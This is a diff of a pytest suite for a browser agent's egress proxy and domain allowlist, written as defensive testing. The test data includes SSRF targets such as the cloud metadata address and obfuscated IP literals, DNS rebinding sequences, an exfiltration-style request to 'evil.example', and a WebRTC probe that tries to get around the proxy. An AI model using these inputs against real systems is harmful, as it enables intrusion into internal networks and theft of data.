@@ -2,6 +2,9 @@
 
 No test reaches the internet or the Anthropic API. The API is a scripted fake
 `call_api(payload) -> dict`; pages come from a local http.server on 127.0.0.1.
+Name resolution is a scripted fake too (`dns`, autouse), the egress proxy can only
+connect to this machine (`no_internet`, autouse), and the local server is reachable
+only through the test-only address override (`loopback_allowed`).
 Tests that drive real Chromium are marked `needs_chromium` and skip when
 Playwright or its browser is not installed.
 """
@@ -11,8 +14,13 @@ from __future__ import annotations
 import asyncio
 import functools
 import http.server
+import ipaddress
+import logging
+import os
+import socket
 import struct
 import threading
+import time
 from collections.abc import Callable
 from contextlib import asynccontextmanager
 from pathlib import Path
@@ -21,6 +29,8 @@ from typing import Any
 
 import pytest
 
+from nous.browser import egress, loop
+from nous.browser import session as browser_session
 from nous.browser.executor import BrowserActionError, BrowserExecutor, ConfirmationRequired
 from nous.browser.loop import (
     HALT_TEXT,
@@ -115,6 +125,60 @@ def _fake_factory(executor: FakeExecutor):
         yield executor
 
     return factory
+
+
+# example.com's address: what the fake resolver answers for any name it was not told about. Nothing
+# connects to it; tests that open connections replace them or use 127.0.0.1.
+PUBLIC_IP = "93.184.215.14"
+
+
+class FakeDns:
+    """Stands in for getaddrinfo. `answers[host]` is a list of successive answers; the last one repeats,
+    and an empty answer does not resolve."""
+
+    def __init__(self) -> None:
+        self.answers: dict[str, list[list[str]]] = {"localhost": [["127.0.0.1"]]}
+        self.calls: list[str] = []
+
+    async def __call__(self, host: str, port: int) -> list:
+        self.calls.append(host)
+        try:
+            ipaddress.ip_address(host)
+            answer = [host]
+        except ValueError:
+            queue = self.answers.get(host, [[PUBLIC_IP]])
+            answer = queue.pop(0) if len(queue) > 1 else queue[0]
+        if not answer:
+            raise socket.gaierror(socket.EAI_NONAME, "Name or service not known")
+        return [(socket.AF_INET6 if ":" in a else socket.AF_INET, socket.SOCK_STREAM, 6, "", (a, port)) for a in answer]
+
+
+@pytest.fixture(autouse=True)
+def dns(monkeypatch: pytest.MonkeyPatch) -> FakeDns:
+    fake = FakeDns()
+    monkeypatch.setattr(egress, "_getaddrinfo", fake)
+    return fake
+
+
+@pytest.fixture(autouse=True)
+def no_internet(monkeypatch: pytest.MonkeyPatch) -> None:
+    """The proxy may only ever connect to this machine in tests, even when a guard under test is broken."""
+    real = egress._open_connection
+
+    async def local_only(address: str, port: int) -> Any:
+        if not ipaddress.ip_address(address).is_loopback:
+            raise ConnectionRefusedError(f"tests never connect to {address}")
+        return await real(address, port)
+
+    monkeypatch.setattr(egress, "_open_connection", local_only)
+
+
+@pytest.fixture
+def loopback_allowed(monkeypatch: pytest.MonkeyPatch) -> None:
+    """The test-only address override: the local http.server counts as public when it is named 127.0.0.1,
+    and by no other name."""
+    real = egress._permitted_address
+    monkeypatch.setattr(egress, "_permitted_address", lambda host, address: real(host, address) or host == "127.0.0.1")
 
 
 def _png_size(data: bytes) -> tuple[int, int]:
@@ -217,28 +281,356 @@ class TestDomainAllowlist:
         assert not DomainAllowlist(["example.com"]).allows(url)
 
     def test_entries_are_normalized(self) -> None:
-        allow = DomainAllowlist(["https://Example.com/path", "*.docs.org", " 127.0.0.1 "])
+        allow = DomainAllowlist(["https://Example.com/path", "*.docs.org", " 1.1.1.1 ", "[2606:4700:4700:0::1111]"])
         assert allow.allows("https://example.com/x")
         assert allow.allows("https://a.docs.org/")
-        assert allow.allows("http://127.0.0.1:9999/")
+        assert allow.allows("http://1.1.1.1:9999/")
+        assert allow.allows("https://[2606:4700:4700::1111]/")
         assert not allow.allows("http://localhost:9999/")
 
     def test_bare_suffixes_are_rejected(self) -> None:
         with pytest.raises(ValueError, match="com"):
             DomainAllowlist(["com"])
-        assert DomainAllowlist(["localhost"]).allows("http://localhost:8080/")
-        assert DomainAllowlist(["::1"]).allows("http://[::1]:8080/")
 
-    @pytest.mark.parametrize("entry", ["169.254.169.254", "fe80::1", "0.0.0.0"])
-    def test_link_local_and_unspecified_addresses_are_rejected(self, entry: str) -> None:
-        with pytest.raises(ValueError, match="link-local"):
+    @pytest.mark.parametrize(
+        "entry",
+        [
+            # Loopback and local names (finding 1)
+            "localhost",
+            "LOCALHOST.",
+            "app.localhost",
+            "http://localhost:8000/facts",
+            "127.0.0.1",
+            "::1",
+            "[::1]",
+            "::ffff:127.0.0.1",
+            "0.0.0.0",
+            # The Docker bridge, the home LAN, other private and special ranges
+            "172.23.0.4",
+            "192.168.1.141",
+            "10.0.0.1",
+            "100.64.0.1",
+            "169.254.169.254",
+            "fe80::1",
+            "fc00::1",
+            "192.0.2.1",
+            "224.0.0.1",
+            "240.0.0.1",
+            # Internal DNS names
+            "nous-postgres",
+            "host.docker.internal",
+            "metadata.google.internal",
+            "printer.local",
+            "router.lan",
+            "nas.home.arpa",
+            # Non-canonical IP literals a browser still reads as addresses (finding 5)
+            "0xa9.0xfe.0xa9.0xfe",
+            "0251.0376.0251.0376",
+            "2852039166",
+            "0x7f000001",
+            "127.1",
+            "1.2.3.0x4",
+            # Not a host name at all
+            "exa mple.com",
+            "evil.com@example.com",
+        ],
+    )
+    def test_internal_and_ip_like_entries_are_refused(self, entry: str) -> None:
+        with pytest.raises(ValueError, match="refused"):
             DomainAllowlist([entry])
+
+    @pytest.mark.parametrize(
+        "entry", ["example.com", "docs.python.org", "1.1.1.1", "2606:4700:4700::1111", "xn--e1afmkfd.xn--p1ai"]
+    )
+    def test_public_names_and_addresses_are_accepted(self, entry: str) -> None:
+        assert DomainAllowlist([entry]).hosts
+
+    def test_one_bad_entry_refuses_the_whole_list(self) -> None:
+        with pytest.raises(ValueError, match="localhost"):
+            DomainAllowlist(["example.com", "localhost"])
 
     def test_empty_allowlist_is_rejected(self) -> None:
         with pytest.raises(ValueError):
             DomainAllowlist([])
         with pytest.raises(ValueError):
             DomainAllowlist(["  ", "https://"])
+
+
+# ---------------------------------------------------------------------------
+# Allowlist resolution at task start (fake DNS, no Chromium)
+# ---------------------------------------------------------------------------
+
+
+class TestStartResolution:
+    async def _run(self, tmp_path: Path, domains: list[str], **kw: Any) -> tuple[Any, FakeApi, FakeExecutor]:
+        api, executor = FakeApi([_response(_text("Done."), stop_reason="end_turn")]), FakeExecutor()
+        result = await run_browser_task(
+            "g", domains, settings=_settings(tmp_path), call_api=api, browser_factory=_fake_factory(executor), **kw
+        )
+        return result, api, executor
+
+    @pytest.mark.parametrize(
+        "answer", [["169.254.169.254"], ["127.0.0.1"], ["10.0.0.7"], [PUBLIC_IP, "192.168.1.141"], ["::ffff:7f00:1"]]
+    )
+    async def test_a_name_resolving_to_a_non_public_address_is_refused(
+        self, tmp_path: Path, dns: FakeDns, answer: list[str]
+    ) -> None:
+        dns.answers["169.254.169.254.nip.io"] = [answer]
+        result, api, executor = await self._run(tmp_path, ["169.254.169.254.nip.io"])
+        assert result.status == "error" and "non-public" in result.summary
+        assert api.payloads == [] and executor.calls == []
+
+    async def test_a_name_that_does_not_resolve_is_refused(self, tmp_path: Path, dns: FakeDns) -> None:
+        dns.answers["typo.example"] = [[]]
+        result, api, _ = await self._run(tmp_path, ["typo.example"])
+        assert result.status == "error" and "does not resolve" in result.summary
+        assert api.payloads == []
+
+    async def test_start_url_resolving_to_a_private_address_is_refused(self, tmp_path: Path, dns: FakeDns) -> None:
+        dns.answers["intranet.example.com"] = [["172.23.0.4"]]
+        result, api, _ = await self._run(tmp_path, ["example.com"], start_url="http://intranet.example.com:8000/")
+        assert result.status == "error" and "intranet.example.com" in result.summary
+        assert api.payloads == []
+
+    async def test_public_names_run(self, tmp_path: Path, dns: FakeDns) -> None:
+        result, _, _ = await self._run(tmp_path, ["example.com", "1.1.1.1"], start_url="https://www.example.com/")
+        assert result.status == "completed"
+        assert set(dns.calls) == {"example.com", "www.example.com"}  # IP literals are not looked up
+
+
+# ---------------------------------------------------------------------------
+# Egress proxy (raw sockets, fake DNS, recorded connections; no Chromium)
+# ---------------------------------------------------------------------------
+
+
+class _Upstream:
+    """A local TCP server standing in for every origin: records each request head, answers 200 "ok".
+    `connects` records the address the proxy asked to connect to."""
+
+    def __init__(self) -> None:
+        self.heads: list[bytes] = []
+        self.connects: list[tuple[str, int]] = []
+        self.port = 0
+        self._server: asyncio.Server | None = None
+
+    async def start(self) -> None:
+        self._server = await asyncio.start_server(self._serve, "127.0.0.1", 0)
+        self.port = self._server.sockets[0].getsockname()[1]
+
+    def close(self) -> None:
+        if self._server is not None:
+            self._server.close()
+
+    async def open_connection(self, address: str, port: int) -> tuple[asyncio.StreamReader, asyncio.StreamWriter]:
+        self.connects.append((address, port))
+        return await asyncio.open_connection("127.0.0.1", self.port)
+
+    async def _serve(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter) -> None:
+        try:
+            self.heads.append(await reader.readuntil(b"\r\n\r\n"))
+            writer.write(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nok")
+            await writer.drain()
+        except (asyncio.IncompleteReadError, ConnectionError):
+            pass
+        finally:
+            writer.close()
+
+
+@pytest.fixture
+async def upstream(monkeypatch: pytest.MonkeyPatch):
+    """Every connection the proxy opens goes to one local server instead of the address it asked for."""
+    server = _Upstream()
+    await server.start()
+    monkeypatch.setattr(egress, "_open_connection", server.open_connection)
+    yield server
+    server.close()
+
+
+@pytest.fixture
+async def proxy():
+    instance = egress.EgressProxy(DomainAllowlist(["example.com"]))
+    await instance.start()
+    yield instance
+    await instance.close()
+
+
+async def _send(proxy: egress.EgressProxy, raw: bytes) -> bytes:
+    reader, writer = await asyncio.open_connection("127.0.0.1", proxy.port)
+    try:
+        writer.write(raw)
+        await writer.drain()
+        return await asyncio.wait_for(reader.read(65536), 5)
+    finally:
+        writer.close()
+
+
+class TestEgressProxy:
+    async def test_connect_to_an_off_list_host_is_refused_unresolved(self, proxy, upstream, dns: FakeDns) -> None:
+        reply = await _send(proxy, b"CONNECT evil.example:443 HTTP/1.1\r\nHost: evil.example:443\r\n\r\n")
+        assert reply.startswith(b"HTTP/1.1 403")
+        assert upstream.connects == [] and dns.calls == [] and proxy.refused == 1
+
+    @pytest.mark.parametrize("answer", [["127.0.0.1"], [PUBLIC_IP, "10.1.2.3"], ["::ffff:127.0.0.1"], ["::1"]])
+    async def test_a_host_resolving_to_a_non_public_address_is_refused(
+        self, proxy, upstream, dns: FakeDns, answer: list[str]
+    ) -> None:
+        dns.answers["rebind.example.com"] = [answer]
+        reply = await _send(proxy, b"CONNECT rebind.example.com:8000 HTTP/1.1\r\n\r\n")
+        assert reply.startswith(b"HTTP/1.1 403")
+        assert upstream.connects == []  # never connects to a refused address
+
+    async def test_a_rebind_cannot_move_a_checked_connection(self, proxy, upstream, dns: FakeDns) -> None:
+        dns.answers["rebind.example.com"] = [[PUBLIC_IP], ["127.0.0.1"]]
+        first = await _send(proxy, b"CONNECT rebind.example.com:8000 HTTP/1.1\r\n\r\n")
+        assert first.startswith(b"HTTP/1.1 200")
+        # One lookup, and the connection went to the address that lookup returned, not to the name.
+        assert dns.calls == ["rebind.example.com"] and upstream.connects == [(PUBLIC_IP, 8000)]
+        second = await _send(proxy, b"CONNECT rebind.example.com:8000 HTTP/1.1\r\n\r\n")
+        assert second.startswith(b"HTTP/1.1 403")  # the rebound answer is checked like any other
+        assert upstream.connects == [(PUBLIC_IP, 8000)]
+
+    async def test_plain_http_to_an_off_list_host_is_refused_and_the_query_is_not_logged(
+        self, proxy, upstream, caplog: pytest.LogCaptureFixture
+    ) -> None:
+        caplog.set_level(logging.INFO, logger="nous.browser.egress")
+        reply = await _send(
+            proxy, b"GET http://evil.example/collect?d=SECRET123 HTTP/1.1\r\nHost: evil.example\r\n\r\n"
+        )
+        assert reply.startswith(b"HTTP/1.1 403") and upstream.connects == []
+        assert "evil.example" in caplog.text and "SECRET123" not in caplog.text and "/collect" not in caplog.text
+
+    async def test_plain_http_is_forwarded_in_origin_form_one_request_per_connection(self, proxy, upstream) -> None:
+        reply = await _send(
+            proxy,
+            b"POST http://docs.example.com/form?q=1 HTTP/1.1\r\nHost: docs.example.com\r\n"
+            b"Proxy-Connection: keep-alive\r\nContent-Length: 3\r\n\r\nabc",
+        )
+        assert reply.startswith(b"HTTP/1.1 200") and reply.endswith(b"ok")
+        assert upstream.connects == [(PUBLIC_IP, 80)]
+        head = upstream.heads[0].decode()
+        assert head.startswith("POST /form?q=1 HTTP/1.1\r\n")
+        assert "Host: docs.example.com" in head and "Connection: close" in head and "Proxy-Connection" not in head
+
+    @pytest.mark.parametrize(
+        "raw, status",
+        [
+            (b"GET /relative HTTP/1.1\r\nHost: example.com\r\n\r\n", b"405"),
+            (b"GET https://example.com/ HTTP/1.1\r\n\r\n", b"405"),
+            (b"CONNECT example.com HTTP/1.1\r\n\r\n", b"400"),
+            (b"CONNECT ::1:443 HTTP/1.1\r\n\r\n", b"400"),
+            (b"POST http://example.com/ HTTP/1.1\r\nTransfer-Encoding: chunked\r\n\r\n", b"411"),
+        ],
+    )
+    async def test_other_requests_are_not_proxied(self, proxy, upstream, raw: bytes, status: bytes) -> None:
+        reply = await _send(proxy, raw)
+        assert reply.startswith(b"HTTP/1.1 " + status) and upstream.connects == []
+
+    async def test_close_cuts_open_tunnels(self, proxy, upstream) -> None:
+        reader, writer = await asyncio.open_connection("127.0.0.1", proxy.port)
+        writer.write(b"CONNECT example.com:443 HTTP/1.1\r\n\r\n")
+        await writer.drain()
+        assert (await reader.readuntil(b"\r\n\r\n")).startswith(b"HTTP/1.1 200")
+        await asyncio.wait_for(proxy.close(), 5)
+        assert await asyncio.wait_for(reader.read(), 5) == b""
+        writer.close()
+
+    def test_the_address_rule_is_is_global_after_unwrapping(self) -> None:
+        ok = egress.address_permitted
+        assert ok("x", ipaddress.ip_address("1.1.1.1")) and ok("x", ipaddress.ip_address("::ffff:1.1.1.1"))
+        for address in [
+            "127.0.0.1",
+            "::ffff:10.0.0.1",
+            "100.64.1.1",
+            "169.254.169.254",
+            "198.18.0.1",
+            "::",
+            "224.0.0.1",
+            "ff0e::1",
+        ]:
+            assert not ok("x", ipaddress.ip_address(address)), address
+
+
+# ---------------------------------------------------------------------------
+# One browser at a time, and run-directory pruning (no Chromium)
+# ---------------------------------------------------------------------------
+
+
+def _held_api() -> tuple[asyncio.Event, Callable[[dict], Any]]:
+    release = asyncio.Event()
+
+    async def held(payload: dict) -> dict:
+        await release.wait()
+        return _response(_text("first"), stop_reason="end_turn")
+
+    return release, held
+
+
+class TestResources:
+    def _task(self, tmp_path: Path, api: Any, **settings: Any) -> Any:
+        return run_browser_task(
+            "g",
+            ["example.com"],
+            settings=_settings(tmp_path, **settings),
+            call_api=api,
+            browser_factory=_fake_factory(FakeExecutor()),
+        )
+
+    async def test_a_second_task_waits_then_reports_busy(self, tmp_path: Path) -> None:
+        release, held = _held_api()
+        first = asyncio.create_task(self._task(tmp_path, held))
+        await asyncio.sleep(0.05)
+        api = FakeApi([_response(_text("second"), stop_reason="end_turn")])
+        second = await self._task(tmp_path, api, browser_task_timeout_seconds=0.3)
+        assert second.status == "busy" and "one runs at a time" in second.summary
+        assert api.payloads == []
+        release.set()
+        assert (await first).status == "completed"
+
+    async def test_a_waiting_task_runs_once_the_slot_frees(self, tmp_path: Path) -> None:
+        release, held = _held_api()
+        first = asyncio.create_task(self._task(tmp_path, held))
+        await asyncio.sleep(0.05)
+        asyncio.get_running_loop().call_later(0.2, release.set)
+        api = FakeApi([_response(_text("second"), stop_reason="end_turn")])
+        second = await self._task(tmp_path, api, browser_task_timeout_seconds=5)
+        assert second.status == "completed" and (await first).status == "completed"
+
+    async def test_busy_is_a_tool_error(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
+        from nous.api.tools import ToolDispatcher
+        from nous.browser import tools
+        from nous.browser.loop import BrowserTaskResult
+
+        async def busy(*args: Any, **kwargs: Any) -> BrowserTaskResult:
+            return BrowserTaskResult("busy", "Another browser_task was still running.", "r1")
+
+        monkeypatch.setattr(tools, "run_browser_task", busy)
+        dispatcher = ToolDispatcher()
+        tools.register_browser_tools(dispatcher, _settings(tmp_path))
+        text, is_error = await dispatcher.dispatch("browser_task", {"goal": "g", "allowed_domains": ["example.com"]})
+        assert is_error and "busy" in text
+
+    def test_old_and_excess_run_dirs_are_pruned(self, tmp_path: Path) -> None:
+        runs = tmp_path / "browser-task"
+        now = time.time()
+        for i in range(60):  # i=0 is the newest
+            run = runs / f"{i:012x}"
+            run.mkdir(parents=True)
+            os.utime(run, (now - i * 60, now - i * 60))
+        stale = runs / "abcdef012345"
+        stale.mkdir()
+        os.utime(stale, (now - 8 * 86_400, now - 8 * 86_400))
+        (runs / "notes").mkdir()
+        loop.prune_runs(runs)
+        kept = sorted(p.name for p in runs.iterdir() if p.name != "notes")
+        assert kept == sorted(f"{i:012x}" for i in range(loop.KEEP_RUNS - 1))
+        assert (runs / "notes").is_dir()  # only run directories are touched
+
+    async def test_a_task_prunes_before_it_starts(self, tmp_path: Path) -> None:
+        stale = tmp_path / "browser-task" / "abcdef012345"
+        stale.mkdir(parents=True)
+        os.utime(stale, (time.time() - 8 * 86_400,) * 2)
+        await self._task(tmp_path, FakeApi([_response(_text("Done."), stop_reason="end_turn")]))
+        assert not stale.exists()
 
 
 # ---------------------------------------------------------------------------
@@ -590,6 +982,12 @@ INDEX_HTML = """<!doctype html>
 
 SECOND_HTML = "<!doctype html><html><head><title>Second</title></head><body><p>Second page body</p></body></html>"
 FRAME_HTML = '<!doctype html><html><body><iframe src="/redir"></iframe></body></html>'
+IMG_HTML = '<!doctype html><html><body><img src="/redir" alt=""></body></html>'
+# A page that leaves the allowlist on its own, after the call that opened it has returned.
+DELAYED_HTML = (
+    "<!doctype html><html><body><p>Wait</p><script>"
+    "setTimeout(() => { location.href = 'http://localhost:{port}/second.html'; }, 400)</script></body></html>"
+)
 _SEEN_HOSTS: list[str] = []  # Host header of every request the local server received
 
 
@@ -603,6 +1001,8 @@ def site(tmp_path: Path):
     (root / "index.html").write_text(INDEX_HTML.replace("{port}", str(port)))
     (root / "second.html").write_text(SECOND_HTML)
     (root / "frame.html").write_text(FRAME_HTML)
+    (root / "img.html").write_text(IMG_HTML)
+    (root / "delayed.html").write_text(DELAYED_HTML.replace("{port}", str(port)))
     _SEEN_HOSTS.clear()
     _QuietHandler.redirect_to = f"http://localhost:{port}/second.html"
     thread = threading.Thread(target=server.serve_forever, daemon=True)
@@ -629,9 +1029,23 @@ class _QuietHandler(http.server.SimpleHTTPRequestHandler):
 
 
 @pytest.fixture
-async def browser(tmp_path: Path, site):
+async def browser(tmp_path: Path, site, loopback_allowed):
     async with BrowserSession(DomainAllowlist(["127.0.0.1"]), tmp_path / "artifacts") as session:
         yield BrowserExecutor(session), session
+
+
+# Tries to send UDP to 127.0.0.1:port around the proxy: a STUN server for WebRTC, and WebTransport (QUIC).
+_UDP_PROBE_JS = """async (port) => {
+  const candidates = [];
+  const pc = new RTCPeerConnection({iceServers: [{urls: 'stun:127.0.0.1:' + port}]});
+  pc.createDataChannel('probe');
+  pc.onicecandidate = (e) => { if (e.candidate && e.candidate.candidate) candidates.push(e.candidate.candidate); };
+  await pc.setLocalDescription(await pc.createOffer());
+  try { new WebTransport('https://127.0.0.1:' + port + '/').ready.catch(() => {}); } catch (e) {}
+  await new Promise(r => setTimeout(r, 2000));
+  pc.close();
+  return candidates;
+}"""
 
 
 def _texts(blocks: list[dict]) -> str:
@@ -752,12 +1166,85 @@ class TestAllowlistAtPlaywrightLayer:
         assert not [h for h in _SEEN_HOSTS if h.startswith("localhost")]
         assert session.blocked_requests >= 3
 
-    async def test_redirect_off_the_allowlist_is_blanked(self, browser, site) -> None:
+    async def test_redirect_off_the_allowlist_never_reaches_the_target(self, browser, site) -> None:
         executor, session = browser
         base, _ = site
         with pytest.raises(BrowserActionError, match="allowlist"):
             await executor.execute("navigate", {"url": f"{base}/redir"})
         assert session.active_page.url == "about:blank"
+        # Routing never sees a redirect hop; the egress proxy refused it before any byte left.
+        assert _SEEN_HOSTS and not [h for h in _SEEN_HOSTS if h.startswith("localhost")]
+
+    async def test_an_image_redirected_off_the_allowlist_never_reaches_the_target(self, browser, site) -> None:
+        executor, session = browser
+        base, _ = site
+        await executor.execute("navigate", {"url": f"{base}/img.html"})
+        await session.active_page.wait_for_load_state("load")
+        await asyncio.sleep(0.3)
+        assert len(_SEEN_HOSTS) >= 2  # the page, and the image's allowed first hop (/redir)
+        assert not [h for h in _SEEN_HOSTS if h.startswith("localhost")]
+        assert session.blocked_requests >= 1
+
+    async def test_a_name_resolving_to_loopback_is_refused_by_the_proxy(
+        self, tmp_path: Path, site, dns: FakeDns, loopback_allowed
+    ) -> None:
+        base, port = site
+        dns.answers["loop.test"] = [["127.0.0.1"]]  # on the allowlist, so routing lets it through
+        async with BrowserSession(DomainAllowlist(["127.0.0.1", "loop.test"]), tmp_path / "artifacts") as session:
+            executor = BrowserExecutor(session)
+            await executor.execute("navigate", {"url": f"{base}/second.html"})
+            results = await session.active_page.evaluate(
+                """async (urls) => Promise.all(urls.map(u => fetch(u).then(r => 'status ' + r.status,
+                    e => 'failed')))""",
+                [f"http://loop.test:{port}/second.html", f"http://localhost:{port}/second.html"],
+            )
+            assert all(r == "failed" or r == "status 403" for r in results), results
+            assert not [h for h in _SEEN_HOSTS if h.startswith(("loop.test", "localhost"))]
+            assert session.blocked_requests >= 2
+
+    async def test_webrtc_and_webtransport_send_no_udp_around_the_proxy(self, browser, site) -> None:
+        executor, session = browser
+        base, _ = site
+        udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        udp.bind(("127.0.0.1", 0))
+        udp.setblocking(False)
+        try:
+            await executor.execute("navigate", {"url": f"{base}/second.html"})
+            candidates = await session.active_page.evaluate(_UDP_PROBE_JS, udp.getsockname()[1])
+            datagrams = 0
+            while True:
+                try:
+                    udp.recvfrom(4096)
+                except (BlockingIOError, OSError):
+                    break
+                datagrams += 1
+        finally:
+            udp.close()
+        assert datagrams == 0 and candidates == []
+
+    async def test_a_delayed_navigation_is_caught_before_the_next_action(
+        self, tmp_path: Path, site, dns: FakeDns, monkeypatch: pytest.MonkeyPatch
+    ) -> None:
+        """The executor's own check, alone: routing and the proxy are opened up so the off-list page loads."""
+        base, port = site
+        local = ("127.0.0.1", "localhost")
+        dns.answers["localhost"] = [["127.0.0.1"]]
+        monkeypatch.setattr(egress, "_permitted_address", lambda host, address: host in local)
+
+        async def let_through(self: BrowserSession, route: Any) -> None:
+            await route.continue_()
+
+        monkeypatch.setattr(BrowserSession, "_route", let_through)
+        async with BrowserSession(DomainAllowlist(["127.0.0.1"]), tmp_path / "artifacts") as session:
+            assert session._proxy is not None
+            session._proxy.allowlist = SimpleNamespace(allows=lambda url: url.split("/")[2].split(":")[0] in local)
+            executor = BrowserExecutor(session)
+            await executor.execute("navigate", {"url": f"{base}/delayed.html"})
+            await session.active_page.wait_for_url(f"http://localhost:{port}/**", timeout=15_000)  # it left
+            with pytest.raises(BrowserActionError, match="allowlist"):
+                await executor.execute("screenshot", {})
+            assert not list((tmp_path / "artifacts").glob("step-*.png"))  # nothing was captured
+            assert session.active_page.url == "about:blank"
 
     async def test_frame_redirected_off_the_allowlist_is_blanked(self, browser, site) -> None:
         executor, session = browser
@@ -887,7 +1374,7 @@ class TestConfirmationGuard:
 
 
 @needs_chromium
-async def test_end_to_end_with_real_browser_and_fake_api(tmp_path: Path, site) -> None:
+async def test_end_to_end_with_real_browser_and_fake_api(tmp_path: Path, site, loopback_allowed) -> None:
     base, _ = site
 
     def answer(payload: dict) -> dict:
@@ -915,6 +1402,100 @@ async def test_end_to_end_with_real_browser_and_fake_api(tmp_path: Path, site) -
     assert "Price: $42" not in out  # ...the outer agent sees only the summary
     assert result.screenshot_path and Path(result.screenshot_path).is_file()
     assert Path(result.screenshot_path).parent.parent == tmp_path / "browser-task"
+
+
+# ---------------------------------------------------------------------------
+# Teardown never leaves a Chromium behind (Linux: the checks read /proc)
+# ---------------------------------------------------------------------------
+
+needs_proc = pytest.mark.skipif(not Path("/proc/self/cmdline").exists(), reason="process checks read /proc")
+
+
+def _session_chromiums() -> list[int]:
+    """Live processes started by a BrowserSession (its marker switch is on their command line)."""
+    pids = []
+    for entry in Path("/proc").iterdir():
+        try:
+            if entry.name.isdigit() and b"--nous-browser-session=" in (entry / "cmdline").read_bytes():
+                pids.append(int(entry.name))
+        except OSError:
+            continue
+    return pids
+
+
+async def _hang(*args: Any, **kwargs: Any) -> None:
+    await asyncio.Event().wait()
+
+
+@needs_chromium
+@needs_proc
+async def test_a_cancelled_task_leaves_no_chromium(tmp_path: Path, site, loopback_allowed) -> None:
+    base, _ = site
+    asked = asyncio.Event()
+
+    async def stall(payload: dict) -> dict:
+        asked.set()
+        await asyncio.Event().wait()
+        raise AssertionError("unreachable")
+
+    task = asyncio.create_task(
+        run_browser_task(
+            "g", ["127.0.0.1"], start_url=f"{base}/second.html", settings=_settings(tmp_path), call_api=stall
+        )
+    )
+    await asyncio.wait_for(asked.wait(), 30)
+    assert _session_chromiums()
+    task.cancel()
+    with pytest.raises(asyncio.CancelledError):
+        await task
+    assert _session_chromiums() == []
+
+
+@needs_chromium
+@needs_proc
+async def test_a_hung_teardown_kills_chromium(
+    tmp_path: Path, site, loopback_allowed, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(browser_session, "CLOSE_STEP_TIMEOUT", 0.5)
+    session = BrowserSession(DomainAllowlist(["127.0.0.1"]), tmp_path / "artifacts")
+    await session.__aenter__()
+    stop_driver = _wedge(session)
+    try:
+        assert _session_chromiums()
+        await asyncio.wait_for(session.__aexit__(None, None, None), 10)
+        assert _session_chromiums() == []  # only the kill could have ended it: every close step hung
+    finally:
+        await stop_driver()
+
+
+@needs_chromium
+@needs_proc
+async def test_a_second_cancel_during_teardown_kills_chromium_and_still_cancels(
+    tmp_path: Path, site, loopback_allowed, monkeypatch: pytest.MonkeyPatch
+) -> None:
+    monkeypatch.setattr(browser_session, "CLOSE_STEP_TIMEOUT", 3.0)
+    session = BrowserSession(DomainAllowlist(["127.0.0.1"]), tmp_path / "artifacts")
+    await session.__aenter__()
+    stop_driver = _wedge(session)
+    try:
+        closing = asyncio.create_task(session.__aexit__(None, None, None))
+        await asyncio.sleep(0.3)
+        closing.cancel()  # during the first hung step, long before its own timeout
+        await asyncio.sleep(1.0)
+        assert _session_chromiums() == []  # killed on the cancel, while the next step still hangs
+        with pytest.raises(asyncio.CancelledError):
+            await asyncio.wait_for(closing, 15)
+    finally:
+        await stop_driver()
+
+
+def _wedge(session: BrowserSession) -> Callable[[], Any]:
+    """Make every close step hang, the Playwright driver included; returns the real driver stop."""
+    stop_driver = session._playwright.stop
+    session._context.close = _hang
+    session._browser.close = _hang
+    session._playwright.stop = _hang
+    return stop_driver
 
 
 # ---------------------------------------------------------------------------
